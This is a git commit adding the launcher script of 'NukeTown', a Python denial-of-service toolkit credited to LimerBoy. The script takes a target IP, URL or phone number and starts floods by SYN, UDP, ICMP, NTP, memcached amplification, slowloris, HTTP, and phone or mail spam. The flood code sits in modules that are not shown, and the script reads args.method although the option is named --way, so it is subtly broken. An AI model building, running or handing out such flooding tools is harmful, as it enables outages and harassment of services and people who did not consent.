cba942bddea7eaf14c4b64ea5056fe33ad8c9403
baleta <mateusbalabenute@yahoo.com.au>
2022-04-19 01:04:42 -0300

    (add) NukeTown DoS ToolKit (BETA)

--- NukeTown.py
+++ NukeTown.py
@@ -1,6 +1,61 @@
+# Created by LimerBoy
+# Import modules
+import os
 import sys
-import os, sys, argparse
+import argparse
 
-# Change to current directory
-os.chdir(os.path.directory(os.path.offpath(__file__)))
+# Go to current dir
+os.chdir(os.path.dirname(os.path.realpath(__file__)))
 
+try:
+    from modules.crash_handler import CriticalError
+    import modules.bones.clear
+    import modules.bones.banner
+    import modules.bones.winpcap
+    from modules.way import AttackMethod
+except ImportError as err:
+    CriticalError("Failed import some modules", err)
+    sys.exit(1)
+
+# Parse args
+parser = argparse.ArgumentParser(description="DoS ToolKit")
+parser.add_argument(
+    "--target",
+    type=str,
+    metavar="<IP:PORT, URL, PHONE>",
+    help="Target ip:port, url or phone",
+)
+parser.add_argument(
+    "--way",
+    type=str,
+    metavar="<JACKPHONE/JACKMAIL/NTP/UDP/SYN/ \
+        ICMP/POD/SLOWLORIS/MEMCACHED/HTTP>",
+    help="Attack method",
+)
+parser.add_argument(
+    "--time", type=int, default=10, metavar="<time>", help="time in secounds"
+)
+parser.add_argument(
+    "--threads", type=int, default=3,
+    metavar="<threads>", help="threads count (1-200)"
+)
+
+# Get args
+args = parser.parse_args()
+threads = args.threads
+time = args.time
+method = str(args.method).upper()
+target = args.target
+
+
+if __name__ == "__main__":
+    # Print help
+    if not method or not target or not time:
+        parser.print_help()
+        sys.exit(1)
+
+    # Run ddos attack
+    with AttackMethod(
+        duration=time, name=method, threads=threads, target=target
+    ) as Flood:
+        Flood.Start()
